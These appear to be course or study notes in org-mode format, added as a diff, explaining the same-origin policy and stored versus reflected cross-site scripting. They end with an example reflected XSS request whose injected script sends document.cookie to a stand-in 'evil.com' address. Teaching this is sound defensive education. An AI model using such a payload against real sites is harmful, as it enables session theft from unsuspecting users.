@@ -1,0 +1,35 @@
+#+title: XSS and UI-based Attacks
+
+* XSS - Cross Site Scripting
+** Introduction
+- SOP prohibits JavaScript's cross-origin access 
+  + evil.com cannot trick a browser into allowing the evil script to access the data on bank.com
+- XSS attacks are used to subvert(颠覆，推翻，破坏) the SOP.
+  - evil.com can trick bank.com by sending his *malicious script* to the browser.
+  - The browser is not able to learn the script comes from evil.com.
+  - So the malicious script operates in the origin of bank.com.
+  - Then the script has full access of data of bank.com
+** Types of XSS attacks
+Actually there are many types of XSS attacks and we only talk about two of them
+- *Stored XSS attacks*
+  The *injected code* is stored on bank.com's server, so the victim server returns the permanently injected code to the browser.
+
+- *Reflected XSS attacks*
+  The *injected code* is reflected off the victim server, a error message or other things can be controlled by attacker
+
+
+** Reflected XSS attacks
+- The attacker *embeds* the malicious script in the URL of another server.
+  + a parameter in the query string 
+
+- The attacker lures the user to visit his page, and then clicks a link to a trusted site(*victim*)
+  + Trick the user into visiting the URL directly 
+
+- The server may echo back the script or the complete URL to the user
+
+
+#+begin_src php
+GET /search.php? term=<script>Send(document.cookie,'admin@evil.com' );</script>
+#+end_src
+
+
